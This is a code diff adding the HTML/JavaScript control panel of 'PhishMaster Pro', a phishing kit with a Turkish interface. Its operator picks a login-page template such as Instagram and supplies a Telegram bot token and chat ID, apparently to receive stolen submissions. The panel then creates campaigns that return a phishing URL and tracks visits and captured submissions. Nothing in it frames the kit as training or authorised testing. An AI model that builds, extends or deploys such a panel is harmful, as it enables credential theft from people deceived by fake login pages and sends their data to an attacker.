@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhishMaster - Professional Phishing Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .template-card:hover {
+            transform: translateY(-5px);
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body class="text-gray-100">
+    <div class="container mx-auto px-4 py-8">
+        <!-- Header -->
+        <div class="text-center mb-12">
+            <h1 class="text-4xl font-bold mb-4">🎣 PhishMaster Pro</h1>
+            <p class="text-xl opacity-90">Professional Phishing Campaign Manager</p>
+        </div>
+
+        <!-- Create Campaign Section -->
+        <div class="glass-card rounded-xl p-6 mb-8 shadow-2xl">
+            <h2 class="text-2xl font-bold mb-6">🚀 Yeni Campaign Oluştur</h2>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <!-- Template Selection -->
+                <div>
+                    <label class="block mb-2 font-medium">Template Seçin:</label>
+                    <div id="templates-container" class="grid grid-cols-3 gap-3">
+                        <!-- Templates will be loaded here -->
+                    </div>
+                </div>
+
+                <!-- Bot Configuration -->
+                <div>
+                    <div class="mb-4">
+                        <label class="block mb-2 font-medium">Telegram Bot Token:</label>
+                        <input type="text" id="bot-token"
+                               class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700 focus:border-blue-500 focus:outline-none"
+                               placeholder="1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ">
+                    </div>
+
+                    <div class="mb-4">
+                        <label class="block mb-2 font-medium">Telegram Chat ID:</label>
+                        <input type="text" id="chat-id"
+                               class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700 focus:border-blue-500 focus:outline-none"
+                               placeholder="-1001234567890">
+                    </div>
+
+                    <button onclick="createCampaign()"
+                            class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300">
+                        <i class="fas fa-rocket mr-2"></i> Campaign Oluştur
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Active Campaigns -->
+        <div class="glass-card rounded-xl p-6 shadow-2xl">
+            <h2 class="text-2xl font-bold mb-6">📊 Aktif Campaign'ler</h2>
+            <div id="campaigns-list" class="space-y-4">
+                <!-- Campaigns will be loaded here -->
+            </div>
+        </div>
+
+        <!-- Instructions -->
+        <div class="mt-8 text-center text-gray-300 text-sm">
+            <p><i class="fas fa-info-circle mr-2"></i>
+                Not: Bot token'inizi @BotFather'dan alabilirsiniz. Chat ID için @getidsbot'u kullanın.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        let selectedTemplate = 'instagram';
+
+        // Load templates
+        async function loadTemplates() {
+            const response = await fetch('/api/templates');
+            const templates = await response.json();
+
+            const container = document.getElementById('templates-container');
+            container.innerHTML = '';
+
+            templates.forEach(template => {
+                const btn = document.createElement('button');
+                btn.className = `template-card p-4 rounded-lg border-2 ${selectedTemplate === template.name ? 'border-blue-500 bg-blue-900/30' : 'border-gray-700 bg-gray-900/50 hover:bg-gray-800/50'}`;
+                btn.onclick = () => selectTemplate(template.name);
+                btn.innerHTML = `
+                    <div class="text-3xl mb-2">${template.icon}</div>
+                    <div class="font-medium">${template.title}</div>
+                `;
+                container.appendChild(btn);
+            });
+        }
+
+        function selectTemplate(template) {
+            selectedTemplate = template;
+            loadTemplates();
+        }
+
+        // Create campaign
+        async function createCampaign() {
+            const botToken = document.getElementById('bot-token').value.trim();
+            const chatId = document.getElementById('chat-id').value.trim();
+
+            if (!botToken || !chatId) {
+                alert('Lütfen bot token ve chat ID girin!');
+                return;
+            }
+
+            const response = await fetch('/create', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    template: selectedTemplate,
+                    bot_token: botToken,
+                    chat_id: chatId
+                })
+            });
+
+            const result = await response.json();
+
+            if (result.success) {
+                alert(`✅ Campaign oluşturuldu!\n\nURL: ${result.phishing_url}\nAdmin Panel: ${result.admin_url}`);
+                loadCampaigns();
+            } else {
+                alert('❌ Hata: ' + result.error);
+            }
+        }
+
+        // Load campaigns
+        async function loadCampaigns() {
+            const response = await fetch('/api/campaigns');
+            const campaigns = await response.json();
+
+            const container = document.getElementById('campaigns-list');
+
+            if (campaigns.length === 0) {
+                container.innerHTML = '<div class="text-center py-8 text-gray-400">Henüz campaign oluşturulmadı.</div>';
+                return;
+            }
+
+            container.innerHTML = '';
+
+            campaigns.forEach(camp => {
+                const card = document.createElement('div');
+                card.className = 'bg-gray-900/50 rounded-lg p-4 border border-gray-700';
+                card.innerHTML = `
+                    <div class="flex justify-between items-center mb-2">
+                        <div>
+                            <span class="font-bold">${camp.template}</span>
+                            <span class="ml-2 text-sm ${camp.active ? 'text-green-400' : 'text-red-400'}">
+                                ${camp.active ? '🟢 Aktif' : '🔴 Pasif'}
+                            </span>
+                        </div>
+                        <div class="space-x-2">
+                            <button onclick="toggleCampaign('${camp.id}')" class="px-3 py-1 rounded ${camp.active ? 'bg-yellow-600 hover:bg-yellow-700' : 'bg-green-600 hover:bg-green-700'}">
+                                ${camp.active ? 'Pasif Yap' : 'Aktif Yap'}
+                            </button>
+                            <button onclick="deleteCampaign('${camp.id}')" class="px-3 py-1 bg-red-600 hover:bg-red-700 rounded">
+                                Sil
+                            </button>
+                            <a href="/admin/${camp.id}" target="_blank" class="px-3 py-1 bg-blue-600 hover:bg-blue-700 rounded">
+                                Admin
+                            </a>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
+                        <div>
+                            <div class="text-gray-400">URL:</div>
+                            <div class="truncate font-mono">${camp.url}</div>
+                        </div>
+                        <div>
+                            <div class="text-gray-400">İstatistikler:</div>
+                            <div>👁️ ${camp.visits} | 📝 ${camp.submissions}</div>
+                        </div>
+                        <div>
+                            <div class="text-gray-400">Oluşturulma:</div>
+                            <div>${new Date(camp.created).toLocaleString()}</div>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // Delete campaign
+        async function deleteCampaign(id) {
+            if (!confirm('Bu campaigni silmek istediğinize emin misiniz?')) return;
+
+            const response = await fetch(`/api/campaign/${id}/delete`, {method: 'POST'});
+            if (response.ok) {
+                loadCampaigns();
+            }
+        }
+
+        // Toggle campaign
+        async function toggleCampaign(id) {
+            const response = await fetch(`/api/campaign/${id}/toggle`, {method: 'POST'});
+            if (response.ok) {
+                loadCampaigns();
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            loadTemplates();
+            loadCampaigns();
+        });
+    </script>
+</body>
+</html>
